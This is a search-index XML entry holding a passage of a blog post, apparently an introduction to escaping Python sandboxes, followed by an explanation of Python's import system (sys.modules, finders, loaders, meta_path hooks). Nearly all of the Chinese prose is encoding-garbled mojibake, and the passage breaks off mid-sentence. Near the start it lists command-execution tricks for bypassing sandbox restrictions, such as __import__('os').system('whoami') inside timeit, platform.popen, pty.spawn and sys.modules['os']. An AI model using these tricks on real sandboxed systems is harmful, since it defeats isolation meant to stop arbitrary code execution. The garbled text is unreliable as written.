<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>åˆæ¢pythonæ²™ç®±é€ƒé€¸</title>
      <link href="/2023/08/28/%E5%88%9D%E6%8E%A2python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2023/08/28/%E5%88%9D%E6%8E%A2python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆæ¢pythonæ²™ç®±é€ƒé€¸"><a href="#åˆæ¢pythonæ²™ç®±é€ƒé€¸" class="headerlink" title="åˆæ¢pythonæ²™ç®±é€ƒé€¸"></a>åˆæ¢pythonæ²™ç®±é€ƒé€¸</h1><p>ä¸ºäº†ä¸è®©æ¶æ„ç”¨æˆ·æ‰§è¡Œä»»æ„çš„ Python ä»£ç ï¼Œå°±éœ€è¦ç¡®ä¿ Python è¿è¡Œåœ¨æ²™ç®±ä¸­ã€‚æ²™ç®±ç»å¸¸ä¼šç¦ç”¨ä¸€äº›æ•æ„Ÿçš„å‡½æ•°å’Œæ¨¡å—ï¼Œä¾‹å¦‚ os</p><p>æ²™ç®±é€ƒé€¸å°±æ˜¯ç»•è¿‡æŸäº›å‡½æ•°ï¼Œç‰¹æ®Šå­—ç¬¦ä¸²ï¼Œæˆ–æ¨¡å—çš„é™åˆ¶ï¼Œè¾¾åˆ°ä¸€ä¸ªæ¼æ´ç¯å¢ƒ</p><h1 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a><strong>åŸºç¡€çŸ¥è¯†</strong></h1><h3 id="å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸æ¨¡å—"><a href="#å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸æ¨¡å—" class="headerlink" title="å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸æ¨¡å—"></a>å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸æ¨¡å—</h3><p>åœ¨ Python ä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼æœ‰ï¼š</p><ul><li>osï¼š<code>system</code>,<code>popen</code></li><li>commandsï¼š(ä»…é™<code>2.x</code>)<code>getstatusoutput</code>,<code>getoutput</code></li><li>subprocess: <code>getstatusoutput</code>,<code>getoutput</code></li><li>timeitï¼š<code>timeit.sys</code>ã€<code>timeit.timeit("__import__('os').system('whoami')", number=1)</code></li><li>platformï¼š<code>platform.os</code>ã€<code>platform.sys</code>ã€<code>platform.popen('whoami', mode='r', bufsize=-1).read()</code></li><li>ptyï¼š<code>pty.spawn('ls')</code>ã€<code>pty.os</code></li><li>bdbï¼š<code>bdb.os</code>ã€<code>cgi.sys</code></li><li>cgiï¼š<code>cgi.os</code>ã€<code>cgi.sys</code></li></ul><pre class="language-none"><code class="language-none">print(os.system('whoami'))print(os.popen('whoami').read()) print(os.popen2('whoami').read()) # 2.xprint(os.popen3('whoami').read()) # 2.xprint(os.popen4('whoami').read()) # 2.x...</code></pre><h2 id="Python-importæœºåˆ¶"><a href="#Python-importæœºåˆ¶" class="headerlink" title="Python importæœºåˆ¶"></a>Python importæœºåˆ¶</h2><p>å…·ä½“ç»†èŠ‚å‚è€ƒå®˜æ–¹æ–‡æ¡£</p><h3 id="æ¨¡å—-module-ä¸-åŒ…-package"><a href="#æ¨¡å—-module-ä¸-åŒ…-package" class="headerlink" title="æ¨¡å— module ä¸ åŒ… package"></a><strong>æ¨¡å— module ä¸ åŒ… package</strong></h3><p>æ¨¡å—â€“</p><p>ä¸€ä¸ª <em>.py</em> åç¼€æ–‡ä»¶å³æ˜¯ Python çš„ä¸€ä¸ªæ¨¡å—ã€‚åœ¨æ¨¡å—çš„å†…éƒ¨ï¼Œå¯ä»¥é€šè¿‡å…¨å±€å˜é‡ <code>__name__</code> æ¥è·å¾—æ¨¡å—åã€‚æ¨¡å—å¯ä»¥åŒ…å«å¯æ‰§è¡Œçš„è¯­å¥ï¼Œè¿™äº›è¯­å¥ä¼šåœ¨æ¨¡å— <strong>åˆå§‹åŒ–</strong> çš„æ—¶å€™æ‰§è¡Œ â€”â€” å½“æ‰€åœ¨æ¨¡å—è¢« <code>import</code> å¯¼å…¥æ—¶å®ƒä»¬æœ‰ä¸”åªä¼šæ‰§è¡Œä¸€æ¬¡ã€‚</p><p>åŒ…â€“</p><p>ç›®å‰çš„ Python å®é™…ä¸Šæ˜¯æœ‰ä¸¤ç§åŒ…çš„å­˜åœ¨ï¼š<strong>æ­£è§„åŒ…</strong>ï¼ˆ<em>regular Package</em>ï¼‰ ä»¥åŠ <strong>å‘½åç©ºé—´åŒ…</strong>ï¼ˆ<em>Namespace package</em>ï¼‰ã€‚</p><blockquote><p>è¦æ³¨æ„çš„æ˜¯ï¼ŒPython çš„ package å®é™…ä¸Šéƒ½æ˜¯ç‰¹æ®Šçš„ module ï¼šå¯ä»¥é€šè¿‡å¯¼å…¥ package ä¹‹åæŸ¥çœ‹ <code>globals()</code> å¯çŸ¥ï¼›å®é™…ä¸Šï¼Œä»»ä½•å¸¦æœ‰ <strong>path</strong> å±æ€§çš„å¯¹è±¡éƒ½ä¼šè¢« Python è§†ä½œ package ã€‚</p></blockquote><ul><li>æ­£è§„åŒ…ï¼š åœ¨ Python 3.2 ä¹‹å‰å°±å·²ç»å­˜åœ¨äº†çš„ï¼Œé€šå¸¸æ˜¯ä»¥åŒ…å«ä¸€ä¸ª <code>__init__.py</code> æ–‡ä»¶çš„ç›®å½•å½¢å¼å±•ç°ã€‚å½“ package è¢«å¯¼å…¥æ—¶ï¼Œè¿™ä¸ª <code>__init__.py</code> æ–‡ä»¶ä¼šè¢« <em>éšå¼</em> åœ°æ‰§è¡Œã€‚</li><li>å‘½åç©ºé—´åŒ…ï¼š æ ¹æ® PEP420 çš„å®šä¹‰ï¼Œå‘½åç©ºé—´åŒ…æ˜¯ç”±å¤šä¸ª <em>portion</em> ç»„æˆçš„ â€”â€” <em>portion</em> ç±»ä¼¼äºçˆ¶åŒ…ä¸‹çš„å­åŒ…ï¼Œä½†å®ƒä»¬ç‰©ç†ä½ç½®ä¸Šä¸ä¸€å®šç›¸é‚»ï¼Œè€Œä¸”å®ƒä»¬å¯èƒ½è¡¨ç°ä¸º .zip ä¸­çš„æ–‡ä»¶ã€ç½‘ç»œä¸Šçš„æ–‡ä»¶ç­‰ç­‰ã€‚å‘½åç©ºé—´åŒ…ä¸éœ€è¦ <code>__init__.py</code> æ–‡ä»¶ï¼Œåªè¦å®ƒæœ¬èº«æˆ–è€…å­åŒ…ï¼ˆä¹Ÿå°±æ˜¯ <em>portion</em>ï¼‰è¢«å¯¼å…¥æ—¶ï¼ŒPython å°±ä¼šç»™é¡¶çº§çš„éƒ¨åˆ†åˆ›å»ºä¸ºå‘½åç©ºé—´åŒ… â€”â€” å› æ­¤ï¼Œå‘½åç©ºé—´åŒ…ä¸ä¸€å®šç›´æ¥å¯¹åº”åˆ°æ–‡ä»¶ç³»ç»Ÿä¸­çš„å¯¹è±¡ï¼Œå®ƒå¯ä»¥æ˜¯ä¸€ä¸ª <em>è™šæ‹Ÿ</em> çš„ module ã€‚</li></ul><h2 id="importå¯¼åŒ…"><a href="#importå¯¼åŒ…" class="headerlink" title="importå¯¼åŒ…"></a>importå¯¼åŒ…</h2><p>importå°±æ˜¯å°†pythonæ–‡ä»¶è½¬åŒ–ä¸ºä¸€ä¸ªpythonå¯¹è±¡â€“module çš„ä¸€ä¸ªæ“ä½œ</p><p>æ¨¡å—ä¸­çš„ Python ä»£ç å¯ä»¥é€šè¿‡ importï¼ˆå¯¼å…¥ï¼‰æ“ä½œè®¿é—®å¦ä¸€ä¸ªæ¨¡å—å†…çš„ä»£ç ã€‚<code>import</code> è¯­å¥æ—¶è°ƒèµ·å¯¼å…¥æœºåˆ¶çš„å¸¸ç”¨æ–¹å¼ï¼Œä½†ä¸æ˜¯å”¯ä¸€æ–¹å¼ã€‚<code>importlib.import_module()</code> ä»¥åŠå†…ç½®çš„ <code>__import__()</code> å‡½æ•°éƒ½å¯ä»¥è°ƒèµ·å¯¼å…¥æœºåˆ¶ã€‚</p><p><code>import</code> è¯­å¥å®é™…ä¸Šç»“åˆäº†ä¸¤ä¸ªæ“ä½œï¼š</p><ol><li>æœç´¢æ“ä½œï¼šæ ¹æ®æŒ‡å®šçš„å‘½åæŸ¥æ‰¾æ¨¡å—</li><li>ç»‘å®šæ“ä½œï¼šå°†æœç´¢çš„ç»“æœç»‘å®šåˆ°å½“å‰ä½œç”¨åŸŸå¯¹åº”çš„å‘½åä¸Š</li></ol><p><code>import</code> çš„ search æ“ä½œå®é™…ä¸Šæ˜¯å¸¦å‚è°ƒç”¨ <code>__import__()</code> å‡½æ•°ï¼Œè€Œå‡½æ•°çš„è¿”å›å€¼ä¼šç”¨åœ¨ <code>import</code> è¯­å¥çš„ç»‘å®šæ“ä½œä¸Šã€‚</p><p>ç›´æ¥è°ƒç”¨ <code>__import__()</code> åªä¼šæ‰§è¡Œæ¨¡å—æŸ¥æ‰¾ï¼Œä»¥åŠå¦‚æœæ‰¾åˆ°çš„è¯å°±åˆ›å»ºæ¨¡å—ã€‚è¿™ä¼šæœ‰ä¸€å®šçš„å‰¯ä½œç”¨ï¼Œæ¯”å¦‚å¯¼å…¥çˆ¶åŒ…å’Œæ›´æ–°å„å¼å„æ ·çš„ç¼“å­˜ï¼ˆåŒ…æ‹¬ <code>sys.modules</code>ï¼‰ï¼Œè€Œä¸”ç»‘å®šæ“ä½œåªæœ‰ <code>import</code> è¯­å¥æ‰ä¼šåšå¾—åˆ°ã€‚</p><blockquote><p>å…¶ä»–è°ƒèµ·å¯¼å…¥æœºåˆ¶çš„è¡Œä¸ºï¼ˆæ¯”å¦‚ <code>importlib.import_module()</code>ï¼‰æœ‰å¯èƒ½ä¼šç»•è¿‡ <code>__import__()</code> å¹¶ä½¿ç”¨è‡ªå®šä¹‰çš„æ–¹æ³•æ¥å®ç°å¯¼å…¥ã€‚</p></blockquote><p>å½“ä¸€ä¸ªæ¨¡å—è¢«é¦–æ¬¡å¯¼å…¥æ—¶ï¼ŒPython ä¼šæœç´¢è¯¥æ¨¡å—ï¼Œå¦‚æœæ‰¾åˆ°å°±åˆ›å»ºä¸€ä¸ª <code>module</code> å¯¹è±¡å¹¶åˆå§‹åŒ–ï¼›å¦‚æœæœªæ‰¾åˆ°åˆ™æŠ›å‡º <code>ModuleNotFoundError</code> å¼‚å¸¸ã€‚è‡³äºå¦‚ä½•æ‰¾åˆ°è¿™äº›æ¨¡å—ï¼ŒPython å®šä¹‰äº†å¤šç§çš„ <strong>æœç´¢ç­–ç•¥</strong> ï¼ˆsearch strategyï¼‰ï¼Œè€Œè¿™äº›ç­–ç•¥å¯ä»¥é€šè¿‡ <code>importlib</code> ç­‰æä¾›çš„å„ç±» hook æ¥ä¿®æ”¹å’Œæ‰©å±•ã€‚</p><blockquote><p>æ ¹æ® Python 3.3 çš„ changlog å¯çŸ¥ç›®å‰å¯¼å…¥ç³»ç»Ÿå·²å®Œå…¨å®ç°äº† PEP302 çš„ææ¡ˆï¼Œæ‰€æœ‰çš„å¯¼å…¥æœºåˆ¶éƒ½ä¼šé€šè¿‡ <code>sys.meta_path</code> æš´éœ²å‡ºæ¥ï¼Œä¸ä¼šå†æœ‰ä»»ä½•éšå¼çš„å¯¼å…¥æœºåˆ¶ã€‚</p></blockquote><h2 id="importæœç´¢æœºåˆ¶"><a href="#importæœç´¢æœºåˆ¶" class="headerlink" title="importæœç´¢æœºåˆ¶"></a>importæœç´¢æœºåˆ¶</h2><h4 id="æ¨¡å—æœç´¢è·¯å¾„"><a href="#æ¨¡å—æœç´¢è·¯å¾„" class="headerlink" title="æ¨¡å—æœç´¢è·¯å¾„"></a><strong>æ¨¡å—æœç´¢è·¯å¾„</strong></h4><p>å½“æˆ‘ä»¬è¦å¯¼å…¥ä¸€ä¸ªæ¨¡å—ï¼ˆæ¯”å¦‚ <code>foo</code> ï¼‰æ—¶ï¼Œè§£é‡Šå™¨é¦–å…ˆä¼šæ ¹æ®å‘½åæŸ¥æ‰¾å†…ç½®æ¨¡å—ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œå®ƒå°±ä¼šå»æŸ¥æ‰¾ <code>sys.path</code> åˆ—è¡¨ä¸­çš„ç›®å½•ï¼Œçœ‹ç›®å½•ä¸­æ˜¯å¦æœ‰ <em>foo.py</em> ã€‚<code>sys.path</code> çš„åˆå§‹å€¼æ¥è‡ªäºï¼š</p><ul><li>è¿è¡Œè„šæœ¬æ‰€åœ¨çš„ç›®å½•ï¼ˆå¦‚æœæ‰“å¼€çš„æ˜¯äº¤äº’å¼è§£é‡Šå™¨åˆ™æ˜¯å½“å‰ç›®å½•ï¼‰</li><li><code>PYTHONPATH</code> ç¯å¢ƒå˜é‡ï¼ˆç±»ä¼¼äº <code>PATH</code> å˜é‡ï¼Œä¹Ÿæ˜¯ä¸€ç»„ç›®å½•åç»„æˆï¼‰</li><li>Python å®‰è£…æ—¶çš„é»˜è®¤è®¾ç½®</li></ul><p>ä¸ºäº†å¼€å§‹æœç´¢ï¼ŒPython éœ€è¦è¢«å¯¼å…¥æ¨¡å—ï¼ˆæˆ–è€…åŒ…ï¼‰çš„å®Œå…¨é™å®šå(<em>fully qualified name</em>)ã€‚è¿™ä¸ªåç§°å¯èƒ½ä½œä¸º <code>import</code> è¯­å¥çš„å‚æ•°å¾—åˆ°ï¼Œæˆ–è€…æ˜¯ä»å‡½æ•° <code>importlib.import_module()</code> æˆ– <code>__import__()</code> çš„ä¼ å‚å¾—åˆ°ã€‚</p><h4 id="1-ç¼“å­˜-cache"><a href="#1-ç¼“å­˜-cache" class="headerlink" title="1.ç¼“å­˜ cache"></a>1.<strong>ç¼“å­˜ cache</strong></h4><p>åœ¨å¯¼å…¥æœç´¢å¼€å§‹å‰ï¼Œä¼šå…ˆæ£€æŸ¥ <code>sys.modules</code> </p><p><code>sys.modules</code> æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œé‡Œé¢å‚¨å­˜äº†åŠ è½½è¿‡çš„æ¨¡å—ä¿¡æ¯ã€‚å¦‚æœ Python æ˜¯åˆšå¯åŠ¨çš„è¯ï¼Œæ‰€åˆ—å‡ºçš„æ¨¡å—å°±æ˜¯è§£é‡Šå™¨åœ¨å¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½çš„æ¨¡å—ã€‚æœ‰äº›åº“ä¾‹å¦‚ <code>os</code> æ˜¯é»˜è®¤è¢«åŠ è½½è¿›æ¥çš„ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼ˆä½†æ˜¯å¯ä»¥é€šè¿‡ <code>sys.modules</code> æ¥ä½¿ç”¨ï¼Œä¾‹å¦‚ <code>sys.modules["os"]</code>ï¼‰ï¼ŒåŸå› åœ¨äº sys.modules ä¸­æœªç» import åŠ è½½çš„æ¨¡å—å¯¹å½“å‰ç©ºé—´æ˜¯ä¸å¯è§çš„ã€‚</p><p>å®ƒæ˜¯å¯¼å…¥ç³»ç»Ÿçš„ç¼“å­˜ï¼Œå¦‚æœä¹‹å‰å·²ç»å¯¼å…¥è¿‡ <code>foo.bar.baz</code>ï¼Œåˆ™å°†ä¼šåŒ…å« <code>foo</code>ï¼Œ<code>foo.bar</code> ä»¥åŠ <code>foo.bar.baz</code> é”®ï¼Œå…¶å¯¹åº”çš„å€¼ä¸ºå„è‡ªçš„ <code>module</code> å¯¹è±¡ã€‚</p><p>å¯¼å…¥æœŸé—´ï¼Œå¦‚æœåœ¨ <code>sys.modules</code> æ‰¾åˆ°å¯¹åº”çš„æ¨¡å—åçš„é”®ï¼Œåˆ™å–å‡ºå…¶å€¼ï¼Œå¯¼å…¥å®Œæˆï¼ˆå¦‚æœå€¼ä¸º <code>None</code> åˆ™æŠ›å‡º <code>ModuleNotFoundError</code> å¼‚å¸¸ï¼‰ï¼›å¦åˆ™å°±è¿›è¡Œæœç´¢æ“ä½œã€‚</p><blockquote><p><code>sys.modules</code> æ˜¯å¯ä¿®æ”¹çš„ï¼Œå¼ºåˆ¶èµ‹å€¼ <code>None</code> ä¼šå¯¼è‡´ä¸‹ä¸€æ¬¡å¯¼å…¥è¯¥æ¨¡å—æŠ›å‡º <code>MoudleNotFoundError</code> å¼‚å¸¸ï¼›å¦‚æœåˆ æ‰è¯¥é”®åˆ™ä¼šè®©ä¸‹æ¬¡å¯¼å…¥è§¦å‘æœç´¢æ“ä½œã€‚</p></blockquote><p>æ³¨æ„ï¼Œå¦‚æœè¦æ›´æ–°ç¼“å­˜ï¼Œä½¿ç”¨ <strong>åˆ é™¤</strong> <strong>sys.modules</strong> <strong>çš„é”®</strong> è¿™ç§åšæ³•ä¼šæœ‰å‰¯ä½œç”¨ï¼Œå› ä¸ºè¿™æ ·å›å¯¼è‡´å‰åå¯¼å…¥çš„åŒåæ¨¡å—çš„ <code>module</code> å¯¹è±¡ä¸æ˜¯åŒä¸€ä¸ªã€‚æœ€å¥½çš„åšæ³•åº”è¯¥æ˜¯ä½¿ç”¨ <code>importlib.reload()</code> å‡½æ•°ã€‚</p><h4 id="2-æŸ¥æ‰¾å™¨-finder-å’ŒåŠ è½½å™¨-loader"><a href="#2-æŸ¥æ‰¾å™¨-finder-å’ŒåŠ è½½å™¨-loader" class="headerlink" title="2.æŸ¥æ‰¾å™¨ finder å’ŒåŠ è½½å™¨ loader"></a>2.<strong>æŸ¥æ‰¾å™¨</strong> <strong>finder</strong> <strong>å’ŒåŠ è½½å™¨</strong> <strong>loader</strong></h4><p>å¦‚æœåœ¨ç¼“å­˜ä¸­æ‰¾ä¸åˆ°æ¨¡å—å¯¹è±¡ï¼Œåˆ™ Python ä¼šæ ¹æ® import åè®®å»æŸ¥æ‰¾å’ŒåŠ è½½è¯¥æ¨¡å—è¿›æ¥ã€‚è¿™ä¸ªåè®®åœ¨ PEP320 ä¸­è¢«æå‡ºï¼Œæœ‰ä¸¤ä¸ªä¸»è¦çš„ç»„æˆæ¦‚å¿µï¼šfinder å’Œ loader ã€‚finder çš„ä»»åŠ¡æ˜¯ç¡®å®šèƒ½å¦æ ¹æ®å·²çŸ¥çš„ç­–ç•¥æ‰¾åˆ°è¯¥åç§°çš„æ¨¡å—ã€‚åŒæ—¶å®ç°äº† finder å’Œ loader æ¥å£çš„å¯¹è±¡å«åš <strong>importer</strong> â€”â€” å®ƒä¼šåœ¨æ‰¾åˆ°èƒ½å¤Ÿè¢«åŠ è½½çš„æ‰€éœ€æ¨¡å—æ—¶è¿”å›è‡ªèº«ã€‚</p><p>Python è‡ªå¸¦äº†ä¸€äº›é»˜è®¤çš„ finder å’Œ importer ã€‚å…¶ä¸­ç¬¬ä¸€ä¸ªçŸ¥é“ <strong>å¦‚ä½•å®šä½å†…ç½®æ¨¡å—</strong>ï¼Œç¬¬äºŒä¸ªçŸ¥é“ <strong>å¦‚ä½•å®šä½ frozen æ¨¡å—</strong>ï¼Œç¬¬ä¸‰ä¸ªé»˜è®¤çš„ finder ä¼šåœ¨ <strong>import path</strong> ä¸­æŸ¥æ‰¾æ¨¡å—ï¼ˆå³ <code>path based finder</code>ï¼‰ã€‚</p><blockquote><p>æ³¨æ„åœ¨ Python 3.4 ä¹‹å‰ finder ä¼šç›´æ¥è¿”å› loader è€Œä¸æ˜¯ module specï¼Œåè€…å®é™…ä¸Šå·²ç»åŒ…å«äº† loader ã€‚</p></blockquote><p>æˆ‘ä»¬å¯ä»¥æ‰“å°æ¥çœ‹ä¸€ä¸‹è¿™ä¸‰ä¸ª Importer å’Œ Finder ï¼š</p><pre class="language-none"><code class="language-none">import sysimport pprintpprint.pprint(sys.meta_path)# [&lt;class '_frozen_importlib.BuiltinImporter'&gt;,#  &lt;class '_frozen_importlib.FrozenImporter'&gt;,#  &lt;class '_frozen_importlib_external.PathFinder'&gt;]</code></pre><p>finder å¹¶ä¸ä¼šçœŸæ­£åŠ è½½æ¨¡å—ã€‚å¦‚æœä»–èƒ½æ‰¾åˆ°å¯¹åº”å‘½åçš„æ¨¡å—ï¼Œä¼šè¿”å›ä¸€ä¸ª <em>module spec</em>ï¼Œå®ƒå®é™…ä¸Šæ˜¯ module å¯¼å…¥æ‰€éœ€ä¿¡æ¯çš„å°è£…ï¼Œä¾›åç»­å¯¼å…¥æœºåˆ¶ä½¿ç”¨æ¥åŠ è½½æ¨¡å—ã€‚</p><h4 id="import-hook"><a href="#import-hook" class="headerlink" title="import hook"></a><strong>import hook</strong></h4><p>import hook æ˜¯ç”¨æ¥æ‰©å±• import æœºåˆ¶çš„ï¼Œå®ƒæœ‰ä¸¤ç§ç±»å‹</p><ul><li>meta hook</li><li>import path hook</li></ul><p>meta hook ä¼šåœ¨å¯¼å…¥çš„æœ€å¼€å§‹è¢«è°ƒç”¨ï¼ˆåœ¨æŸ¥æ‰¾ç¼“å­˜ <code>sys.modules</code> ä¹‹åï¼‰ï¼Œä½ å¯ä»¥åœ¨è¿™é‡Œé‡è½½å¯¹ <code>sys.path</code>ã€frozen moduleç”šè‡³å†…ç½® module çš„å¤„ç†ã€‚åªéœ€è¦å¾€ <code>sys.meta_path</code> æ·»åŠ ä¸€ä¸ªæ–°çš„ finder å³å¯æ³¨å†Œ meta_hook ã€‚</p><p>import path hook ä¼šåœ¨ <code>sys.path</code> ï¼ˆæˆ– <code>package.__path__</code>ï¼‰å¤„ç†æ—¶è¢«è°ƒç”¨ï¼Œå®ƒä»¬ä¼šè´Ÿè´£å¤„ç† <code>sys.path</code> ä¸­çš„æ¡ç›®ã€‚åªéœ€è¦å¾€ <code>sys.path_hooks</code> æ·»åŠ ä¸€ä¸ªæ–°çš„å¯è°ƒç”¨å¯¹è±¡å³å¯æ³¨å†Œ import path hook ã€‚</p><h4 id="å…ƒè·¯å¾„-meta-path"><a href="#å…ƒè·¯å¾„-meta-path" class="headerlink" title="å…ƒè·¯å¾„ meta_path"></a><strong>å…ƒè·¯å¾„ meta_path</strong></h4><p>å½“æ— æ³•ä» <code>sys.modules</code> ä¸­æ‰¾åˆ°æ¨¡å—æ—¶ï¼ŒPython ä¼šç»§ç»­æœç´¢ <code>sys.meta_path</code> åˆ—è¡¨ï¼Œåˆ—è¡¨ä¸­çš„ finder ä¼šè¢«<strong>ä¾æ¬¡</strong>ç”¨æ¥æŸ¥è¯¢æ˜¯å¦çŸ¥é“å¦‚ä½•å¤„ç†è¿™ä¸ªå‘½åçš„æ¨¡å—ã€‚</p><p>æ‰€æœ‰çš„ <em>meta path</em> <em>finder</em> éƒ½å¿…é¡»å®ç° <code>find_spec</code> æ–¹æ³•ï¼ˆå‚è€ƒ <em>importlib.abc.MetaPathFinder.find_spec</em>ï¼‰ï¼Œå¦‚æœæ— æ³•å¤„ç†å°±è¿”å› <code>None</code>ï¼›å¦åˆ™è¿”å›ä¸€ä¸ª <code>spec</code> å¯¹è±¡ï¼ˆå³ <code>importlib.machinery.ModuleSpec</code> çš„å®ä¾‹ï¼‰ã€‚å¦‚æœå…¨éƒ¨çš„ finder éƒ½æ²¡æœ‰è¿”å›ï¼Œå°†æŠ›å‡º <code>ModuleNotFoundError</code> å¼‚å¸¸å¹¶æ”¾å¼ƒå¯¼å…¥ã€‚</p><p><strong>find_spec(fullname, path, target=None)</strong></p><p>ä»¥ foo.bar.baz æ¨¡å—ä¸ºä¾‹å¯¹ <code>find_spec</code> è¿›è¡Œè¯´æ˜</p><p>å‚æ•°è¯´æ˜ç¤ºä¾‹fullnameè¢«å¯¼å…¥æ¨¡å—çš„å®Œå…¨é™å®šåfoo.bar.bazpathä¾›æœç´¢ä½¿ç”¨çš„è·¯å¾„åˆ—è¡¨ï¼Œå¯¹äºæœ€é¡¶çº§æ¨¡å—ï¼Œè¿™ä¸ªå€¼ä¸º Noneï¼›å¯¹äºå­åŒ…ï¼Œè¿™ä¸ªå€¼ä¸ºçˆ¶åŒ…çš„ <strong>path</strong> å±æ€§å€¼foo.bar.__path__targetç”¨ä½œç¨ååŠ è½½ç›®æ ‡çš„ç°æœ‰æ¨¡å—å¯¹è±¡ï¼Œè¿™ä¸ªå€¼ä»…ä¼šåœ¨é‡è½½æ¨¡å—æ—¶ä¼ å…¥None</p><p>å¯¹äºå•ä¸ªå¯¼å…¥è¯·æ±‚å¯èƒ½ä¼šå¤šæ¬¡éå† meta_pathï¼ŒåŠ å…¥ç¤ºä¾‹çš„æ¨¡å—éƒ½å°šæœªè¢«ç¼“å­˜ï¼Œåˆ™ä¼šåœ¨æ¯ä¸ª finder ï¼ˆä»¥ <code>mpf</code> å‘½åï¼‰ä¸Šä¾æ¬¡è°ƒç”¨</p><ul><li>mpf.find_spec(â€œfooâ€, None, None)</li><li>mpf.find_spec(â€œfoo.barâ€, foo.<strong>path</strong>, None)</li><li>mpf.find_spec(â€œfoo.bar.bazâ€, foo.bar.<strong>path</strong>, None)</li></ul><blockquote><p>Python 3.4 ä¹‹å finder çš„ <code>find_module()</code> å·²è¢« <code>find_spec()</code> æ‰€æ›¿ä»£å¹¶å¼ƒç”¨ã€‚</p></blockquote><h2 id="importåŠ è½½æœºåˆ¶"><a href="#importåŠ è½½æœºåˆ¶" class="headerlink" title="importåŠ è½½æœºåˆ¶"></a>importåŠ è½½æœºåˆ¶</h2><p>æºä»£ç </p><pre class="language-none"><code class="language-none">module = Noneif spec.loader is not None and hasattr(spec.loader, 'create_module'):    # It is assumed 'exec_module' will also be defined on the loader.    # å‡å®š loader ä¸­å·²ç»å®šä¹‰äº† `exec_module` æ¨¡å—    module = spec.loader.create_module(spec)if module is None:    module = ModuleType(spec.name)# The import-related module attributes get set here:# å’Œæ¨¡å—å¯¼å…¥ç›¸å…³è”çš„å±æ€§åœ¨è¿™ä¸ªåˆå§‹åŒ–æ–¹æ³•ä¸­è¢«è®¾ç½®_init_module_attrs(spec, module)if spec.loader is None:    if spec.submodule_search_locations is not None:        # namespace package        # å€˜è‹¥è¿™ä¸ªæ¨¡å—æ˜¯å‘½åç©ºé—´åŒ…        sys.modules[spec.name] = module    else:        # unsupported        # ä¸æ”¯æŒå‘½åç©ºé—´åŒ…        raise ImportErrorelif not hasattr(spec.loader, 'exec_module'):    module = spec.loader.load_module(spec.name)    # Set __loader__ and __package__ if missing.    # å¦‚æœç¼ºå¤± `__loader__` å’Œ `__package__` å±æ€§åˆ™è¦è¡¥å……else:    sys.modules[spec.name] = module    try:        spec.loader.exec_module(module)    except BaseException:        try:            del sys.modules[spec.name]        except KeyError:            pass        raisereturn sys.modules[spec.name]</code></pre><p>ä»¥ä¸‹æ˜¯ä¸€äº›ç»†èŠ‚ï¼š</p><ul><li>åœ¨ loader æ‰§è¡Œ <code>exec_module</code> ä¹‹å‰ï¼Œéœ€è¦å°†æ¨¡å—ç¼“å­˜åœ¨ <code>sys.modules</code> ï¼šå› ä¸ºæ¨¡å—å¯èƒ½ä¼šå¯¼å…¥è‡ªèº«ï¼Œè¿™æ ·åšå¯ä»¥é˜²æ­¢æ— é™é€’å½’ï¼ˆæœ€åæƒ…å†µï¼‰æˆ–å¤šæ¬¡åŠ è½½ï¼ˆæœ€å¥½æƒ…å†µï¼‰ã€‚</li><li>å¦‚æœåŠ è½½å¤±è´¥ï¼Œé‚£ä¹ˆå¤±è´¥çš„æ¨¡å—ä¼šä» <code>sys.modules</code> ä¸­è¢«ç§»é™¤ã€‚ä»»ä½•å·²ç»å­˜åœ¨çš„æ¨¡å—æˆ–è€…ä¾èµ–ä½†æˆåŠŸåŠ è½½çš„æ¨¡å—éƒ½ä¼šä¿ç•™ â€”â€” è¿™å’Œé‡è½½ä¸ä¸€æ ·ï¼Œåè€…å³ä½¿åŠ è½½å¤±è´¥ä¹Ÿä¼šä¿ç•™å¤±è´¥çš„æ¨¡å—åœ¨ <code>sys.modules</code> ä¸­ã€‚</li><li>æ¨¡å—çš„æ‰§è¡Œæ˜¯åŠ è½½çš„å…³é”®æ­¥éª¤ï¼Œå®ƒè´Ÿè´£å¡«å……æ¨¡å—çš„å‘½åç©ºé—´ã€‚æ¨¡å—æ‰§è¡Œå°†ä¼šå…¨æƒå§”æ‰˜ç»™ loader ï¼Œç”± loader å†³å®šå¦‚ä½•å¡«å……å’Œå¡«å……ä»€ä¹ˆã€‚</li><li>åˆ›å»ºå‡ºæ¥å¹¶ä¼ é€’ç»™ <code>exec_module</code> æ‰§è¡Œçš„ module å¯¹è±¡å¯èƒ½å’Œæœ€åè¢« import çš„ module å¯¹è±¡ä¸ä¸€æ ·ã€‚</li></ul><h3 id="loader-å¯¹è±¡"><a href="#loader-å¯¹è±¡" class="headerlink" title="loader å¯¹è±¡"></a><strong>loader</strong> <strong>å¯¹è±¡</strong></h3><p>loader æ˜¯ <code>importlib.abc.Loader</code> çš„å®ä¾‹ï¼Œè´Ÿè´£æä¾›æœ€å…³é”®çš„åŠ è½½åŠŸèƒ½ï¼šæ¨¡å—æ‰§è¡Œã€‚å®ƒçš„ <code>exec_module()</code> æ–¹æ³•æ¥å—å”¯ä¸€ä¸€ä¸ªå‚æ•° â€”â€” module å¯¹è±¡ï¼Œå®ƒæ‰€æœ‰çš„è¿”å›å€¼éƒ½ä¼šè¢«å¿½ç•¥ã€‚</p><p>loader å¿…é¡»æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>å¦‚æœè¿™ä¸ª module æ˜¯ä¸€ä¸ª Python moduleï¼ˆå’Œå†…ç½®æ¨¡å—ä»¥åŠåŠ¨æ€åŠ è½½çš„æ‰©å±•ç›¸åŒºåˆ†ï¼‰ï¼Œåˆ™ loader 